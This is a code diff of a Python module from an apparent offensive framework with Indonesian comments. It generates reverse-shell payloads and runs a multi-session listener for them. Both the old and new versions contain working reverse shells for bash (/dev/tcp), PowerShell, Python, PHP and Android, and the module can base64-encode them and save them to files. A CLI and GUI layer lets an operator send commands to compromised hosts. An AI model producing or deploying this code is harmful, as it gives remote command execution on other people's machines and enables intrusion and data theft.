@@ -49,56 +49,30 @@ OPTIONS = {
 SESSIONS = {}
 SESSION_LOCK = threading.Lock()
 
-# === PAYLOAD GENERATOR (FIXED: FULL INTERACTIVE) ===
+# === PAYLOAD GENERATOR ===
 def generate_payload(lhost, lport, payload_type):
     payloads = {
-        "python": f'''import socket, subprocess, os
+        "python": f"""import socket, subprocess, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("{lhost}", {lport}))
-while True:
-    try:
-        data = s.recv(1024).decode(errors='ignore').strip()
-        if not data or data.lower() == "exit": break
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout, stderr = proc.communicate()
-        output = stdout + stderr
-        if output: s.send(output + b"\\n")
-        else: s.send(b"\\n")
-    except Exception as e:
-        break
-s.close()''',
+os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])""",
 
-        "windows": f'''powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();while($true){{$data = $stream.Read((New-Object Byte[] 1024),0,1024);if($data.Length -eq 0){{break}}$cmd = [Text.Encoding]::UTF8.GetString($data).Trim();if($cmd -eq 'exit'){{break}}$output = iex $cmd 2>&1 | Out-String;$sendback = [Text.Encoding]::UTF8.GetBytes($output);$stream.Write($sendback,0,$sendback.Length)}};$client.Close()"''',
+        "windows": f"""powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""",
 
-        "linux": f"""bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; while read line <&5; do eval "$line" 2>&1 | tee >&5; done'""",
+        "linux": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
 
-        "bash": f"""bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; while read line <&5; do eval "$line" 2>&1 | tee >&5; done'""",
+        "php": f"""<?php set_time_limit(0); $ip='{lhost}'; $port={lport}; $sock=fsockopen($ip,$port); while($sock){{$cmd=fread($sock,1024); if(!$cmd) break; $output=shell_exec($cmd); fwrite($sock,$output);}} fclose($sock); ?>""",
 
-        "php": f"""<?php
-set_time_limit(0);
-$ip = '{lhost}'; $port = {lport};
-$sock = fsockopen($ip, $port);
-while ($sock) {{
-    $cmd = fgets($sock);
-    if (!$cmd) break;
-    $output = shell_exec(trim($cmd));
-    fwrite($sock, $output);
-}}
-fclose($sock);
-?>""",
+        "bash": f"""bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'""",
 
-        "android": f'''import socket, subprocess, os
+        "android": f"""import socket,subprocess,os,ssl
+context = ssl._create_unverified_context()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = context.wrap_socket(s, server_hostname="{lhost}")
 s.connect(("{lhost}", {lport}))
-while True:
-    try:
-        data = s.recv(1024).decode(errors='ignore').strip()
-        if not data or data == "exit": break
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = proc.communicate()[0] + proc.communicate()[1]
-        s.send(output + b"\\n")
-    except: break
-s.close()'''
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/system/bin/sh","-i"])"""
     }
     return payloads.get(payload_type.lower(), "").strip()
 
@@ -106,104 +80,122 @@ s.close()'''
 def send_session_command(session_id, command):
     """Send command to specific session (untuk GUI)"""
     if session_id not in SESSIONS:
+        console.print(f"[red]Session {session_id} tidak ditemukan[/]")
         return False
-    with SESSION_LOCK:
-        SESSIONS[session_id]['pending_cmd'] = command.strip()
-    return True
+    
+    session = SESSIONS[session_id]
+    sock = session['socket']
+    
+    try:
+        # Send command dengan newline
+        sock.send((command + "\n").encode())
+        console.print(f"[green]Perintah berhasil dikirim: {command}[/]")
+        return True
+    except Exception as e:
+        console.print(f"[red]Gagal mengirim perintah: {e}[/]")
+        return False
 
-# === IMPROVED HANDLER (FIXED: FULL DUPLEX) ===
+# === IMPROVED HANDLER (FIXED - No Echo Loop) ===
 def handler(client_sock, addr, framework_session):
-    sess_id = f"{addr[0]}_{int(time.time() * 1000) % 100000}"
+    sess_id = f"{addr[0]}_{int(time.time() * 10000) % 10000}"
 
     session_data = {
         'socket': client_sock,
         'ip': addr[0],
         'port': addr[1],
-        'type': 'reverse_tcp',
+        'type': 'reverse_tcp', 
         'output': '',
         'created': time.strftime("%H:%M:%S"),
-        'status': 'alive',
-        'pending_cmd': None
+        'status': 'alive'
     }
 
-    # Add to global SESSIONS
-    with SESSION_LOCK:
-        SESSIONS[sess_id] = session_data
-
-    # GUI Integration
+    # === GUI INTEGRATION ===
     gui_sessions = framework_session.get('gui_sessions')
     gui_instance = framework_session.get('gui_instance')
-    if gui_sessions:
+
+    # Add to GUI (thread-safe)
+    if gui_sessions is not None:
         with gui_sessions['lock']:
             gui_sessions['dict'][sess_id] = session_data
         if GUI_AVAILABLE and gui_instance:
             QTimer.singleShot(0, gui_instance.update_sessions_ui)
 
+    # Add to global SESSIONS
+    with SESSION_LOCK:
+        SESSIONS[sess_id] = session_data
+
     console.print(f"[bold green][+] Session {sess_id} opened from {addr}[/]")
 
     try:
-        client_sock.settimeout(1.0)
+        # Set socket timeout untuk non-blocking
+        client_sock.settimeout(1)  # Increased timeout to allow for data to be received
         buffer = ""
-
+        
         while True:
-            # === KIRIM COMMAND DARI GUI ===
-            cmd = session_data.get('pending_cmd')
-            if cmd:
-                try:
-                    client_sock.send((cmd + "\n").encode())
-                    with SESSION_LOCK:
-                        SESSIONS[sess_id]['pending_cmd'] = None
-                except:
-                    break
-
-            # === TERIMA OUTPUT DARI TARGET ===
             try:
-                ready = select.select([client_sock], [], [], 0.1)
-                if ready[0]:
-                    data = client_sock.recv(4096)
-                    if not data:
-                        break
-                    decoded = data.decode('utf-8', errors='ignore')
-                    buffer += decoded
-
-                    # Proses baris lengkap
-                    while '\n' in buffer:
-                        line, buffer = buffer.split('\n', 1)
-                        line = line.rstrip()
-                        if line:
-                            # Simpan output
+                # HANYA RECEIVE DATA DARI CLIENT (shell)
+                data = client_sock.recv(4096)
+                if not data:
+                    break  # Connection closed
+                    
+                decoded_data = data.decode('utf-8', errors='ignore')
+                buffer += decoded_data
+                
+                # Process complete lines
+                if '\n' in buffer:
+                    lines = buffer.split('\n')
+                    buffer = lines[-1]  # Keep incomplete line
+                    
+                    for line in lines[:-1]:
+                        if line.strip():
+                            # SIMPAN OUTPUT KE SESSION (TANPA MENGIRIM BALIK)
+                            if gui_sessions:
+                                with gui_sessions['lock']:
+                                    if sess_id in gui_sessions['dict']:
+                                        gui_sessions['dict'][sess_id]['output'] += line + "\n"
+                            
                             with SESSION_LOCK:
                                 if sess_id in SESSIONS:
                                     SESSIONS[sess_id]['output'] += line + "\n"
-                            # Update GUI
+                            
+                            # Update GUI jika ada instance
                             if GUI_AVAILABLE and gui_instance:
-                                QTimer.singleShot(0, lambda l=line: gui_instance.append_output(f"[session:{sess_id}] {l}"))
+                                QTimer.singleShot(0, lambda sid=sess_id, l=line: gui_instance.append_output(f"[session:{sid}] {l}"))
+
             except socket.timeout:
-                continue
-            except:
+                continue  # Timeout normal untuk non-blocking
+            except Exception as e:
+                console.print(f"[red]Receive error: {e}[/]")
                 break
 
     except Exception as e:
         console.print(f"[red][!] Handler error: {e}[/]")
+
     finally:
         try:
             client_sock.close()
         except:
             pass
 
-        # Cleanup
-        with SESSION_LOCK:
-            SESSIONS.pop(sess_id, None)
+        # Remove from GUI
         if gui_sessions:
             with gui_sessions['lock']:
                 gui_sessions['dict'].pop(sess_id, None)
             if GUI_AVAILABLE and gui_instance:
                 QTimer.singleShot(0, gui_instance.update_sessions_ui)
 
+        # Remove from global
+        with SESSION_LOCK:
+            SESSIONS.pop(sess_id, None)
+
         console.print(f"[bold red][-] Session {sess_id} closed[/]")
 
-# === LISTENER + HANDLER ===
+# === LISTENER + HANDLER (Thread-safe GUI Update) ===
 def start_listener(lhost, lport, framework_session):
+    def connection_handler(client_sock, addr):
+        handler(client_sock, addr, framework_session)
+
+    # === SERVER ===
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
@@ -212,7 +204,7 @@ def start_listener(lhost, lport, framework_session):
         console.print(f"[bold cyan][*] Listening on {lhost}:{lport}...[/]")
         while True:
             client_sock, addr = server.accept()
-            t = threading.Thread(target=handler, args=(client_sock, addr, framework_session), daemon=True)
+            t = threading.Thread(target=connection_handler, args=(client_sock, addr), daemon=True)
             t.start()
     except Exception as e:
         console.print(f"[red][!] Listener error: {e}[/]")
@@ -227,10 +219,12 @@ def run(session, options):
     output_file = options.get("OUTPUT")
     encode = options.get("ENCODE", "no").lower() == "yes"
 
+    # Validate payload
     if payload_type not in ["python", "windows", "linux", "php", "bash", "android"]:
         console.print(f"[red][!] Invalid PAYLOAD: {payload_type}[/]")
         return
 
+    # Generate
     payload = generate_payload(lhost, lport, payload_type)
     if not payload:
         console.print("[red][!] Failed to generate payload[/]")
@@ -240,6 +234,7 @@ def run(session, options):
         payload = base64.b64encode(payload.encode()).decode()
         console.print("[yellow][*] Payload encoded with base64[/]")
 
+    # Save file
     if output_file:
         ext = {"windows": ".ps1", "php": ".php", "python": ".py", "android": ".py", "bash": ".sh", "linux": ".sh"}.get(payload_type, ".txt")
         if not output_file.endswith(ext):
@@ -251,20 +246,27 @@ def run(session, options):
         except Exception as e:
             console.print(f"[red][!] Save failed: {e}[/]")
 
+    # Show payload
     console.print("\n[bold white]Payload:[/]")
     console.print(Panel(payload, title=payload_type.upper(), border_style="blue"))
 
+    # Start listener
     console.print(f"\n[bold yellow][*] Starting listener on {lhost}:{lport}...[/]")
     console.print("[dim]Sessions will appear in GUI → Sessions tab[/]")
 
-    listener_thread = threading.Thread(target=start_listener, args=(lhost, lport, session), daemon=True)
+    listener_thread = threading.Thread(
+        target=start_listener,
+        args=(lhost, lport, session),
+        daemon=True
+    )
     listener_thread.start()
 
+    # Save session refs
     session['reverse_tcp_listener'] = listener_thread
     session['reverse_tcp_sessions'] = SESSIONS
     session['reverse_tcp_lock'] = SESSION_LOCK
 
-    # CLI Mode
+    # === CLI MODE (non-GUI) ===
     if hasattr(sys.stdin, 'fileno') and not session.get('gui_mode', False):
         try:
             while True:
@@ -301,49 +303,77 @@ def interact_session(sid):
     if sid not in SESSIONS:
         console.print(f"[red][!] Session {sid} not found[/]")
         return
+        
     console.print(f"[green][*] Interacting with {sid}... (Type 'exit' to return)[/]")
+    
     try:
         while True:
             cmd = input(f"{sid} > ").strip()
             if cmd.lower() in ["exit", "quit"]:
                 break
-            if not cmd: continue
+            if not cmd:
+                continue
+                
+            # Send command dan dapatkan response
             if send_session_command(sid, cmd):
-                time.sleep(0.3)
-                output = SESSIONS[sid]['output'].split('\n')[-10:]
-                console.print('\n'.join([l for l in output if l.strip()]))
+                # Tunggu sebentar untuk response
+                time.sleep(0.5)
+                
+                # Tampilkan output terbaru dari session
+                if sid in SESSIONS:
+                    output = SESSIONS[sid]['output']
+                    # Hanya tampilkan output yang baru
+                    lines = output.split('\n')
+                    if len(lines) > 10:  # Batasi output
+                        lines = lines[-10:]
+                    console.print('\n'.join(lines))
             else:
-                console.print("[red]Failed to send command[/]")
+                console.print(f"[red]Failed to send command[/]")
+                
     except KeyboardInterrupt:
-        console.print("\n[yellow][*] Returning...[/]")
+        console.print(f"\n[yellow][*] Returning to main menu...[/]")
+    except Exception as e:
+        console.print(f"[red][!] Interaction error: {e}[/]")
 
 def kill_session(sid):
     if sid not in SESSIONS:
         console.print(f"[red][!] Session {sid} not found[/]")
         return
+
     try:
+        # 1. Tutup socket
         SESSIONS[sid]['socket'].close()
+
+        # 2. Hapus dari SESSIONS (thread-safe)
         with SESSION_LOCK:
             SESSIONS.pop(sid, None)
+
+        # 3. Hapus dari GUI (thread-safe)
         gui_sessions = None
+        gui_instance = None
+        # Cari session dari framework (jika ada)
         if 'framework_session' in globals():
             fs = globals()['framework_session']
             gui_sessions = fs.get('gui_sessions')
             gui_instance = fs.get('gui_instance')
+
         if gui_sessions and GUI_AVAILABLE and gui_instance:
-            def safe_update():
+            def safe_gui_update():
                 with gui_sessions['lock']:
                     gui_sessions['dict'].pop(sid, None)
                 gui_instance.update_sessions_ui()
-            QTimer.singleShot(0, safe_update)
+            QTimer.singleShot(0, safe_gui_update)
+
         console.print(f"[green][+] Session {sid} killed[/]")
     except Exception as e:
         console.print(f"[red][!] Kill failed: {e}[/]")
 
-# === GUI HELPERS ===
+# === GUI INTEGRATION HELPERS ===
 def get_active_sessions():
+    """Get active sessions for GUI"""
     with SESSION_LOCK:
         return SESSIONS.copy()
 
 def close_session(session_id):
+    """Close specific session from GUI"""
     kill_session(session_id)
